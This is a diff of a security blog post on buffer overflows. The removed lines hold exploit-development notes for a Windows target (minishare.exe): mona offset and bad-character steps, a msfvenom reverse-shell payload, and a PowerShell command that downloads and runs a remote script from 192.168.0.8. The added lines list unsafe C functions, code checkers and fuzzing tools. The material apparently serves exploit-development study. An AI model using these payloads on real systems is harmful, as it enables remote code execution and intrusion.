@@ -4,45 +4,32 @@ description: ""
 pubDate: "Jul 08 2022"
 heroImage: "/xlrf.png"
 banner: "my_banner"
-slug: 'buffer-overflow'
+slug: 'buffer-overflow/intro'
 ---
 
-### Example
+### Finding Buffer Overflows
 
-```bash
-!mona config -set workingfolder C:/User/printer/Desktop
+|*strcpy* | *strcat* | *gets / fgets* |
 
-# Cuando payload = offset + eip + b"C"*200 van al espcreamos nuestro bytearray para ver badchars lo pasamos con impacket-smbserver
+|*scanf / fscanf* | *vsprintf* | *printf* |
 
-!mona bytearray -cpb "\x00" -> insted 'C' string
+|*memcpy*
 
-!mona compare -a 0xESP -f C:\Users\printer\bytearray.bin
+This tools can check your code for posibles overflows.
 
-# eip ya tienes off_set, EIP +  B"\x90"*20=space  ,  bad chars shellcode msfvenom
+- splint.org
+- Cppcheck
+- cloud-fuzzing
 
-!mona modules
+Almost 50% of vulnerabilities are not exploitable, but they may lead to DOS or cause other side-effects.
 
-eip = pack("<L", 0xFIND)
+**Fuzzing** is a software testing technique that provides invalid data, unexpected or random data as input to a program. Inpu can be in any form such as:
 
-eip se encuetra = !mona find -s "\xFF\xE4" -m minishare.exe | SLMFC.DLL
+Command line | Parameters | Network data | File input | Databases | Shared memory regions | Keyboard/mouse input | Environment variables.
 
-# si no encuentra : !mona findwild -s "JMP ESP" te vas a la pestaña 'l' nos cojemos el puntero q no tenga badchars y lo pegamos en minuscula el addrs en nuestro script que corresponde a pack('<L', 0xaddrs_pointer)
+#### Fuzzing tools and frameworks:
 
-msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.8 LPORT=443 -f c -e x86/shikata_ga_nai EXITFUNC=thread -b "\x00\x0a\x0d"
-
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-
-jmp ESP
-#o alternativa con nods
-sub esp,0x10
-
-!mona modules
-
-trick: if to many bad char remove -e x86/shikata_ga_nai
-
-msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http
-://192.168.0.8/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\
-x0d' EXITFUNC=thread
-
-nishang Incoke.powershelltcp.ps1
-```
+- Peach Fuzzing Platform
+- Sulley
+- Sfuzz
+- FileFuzz
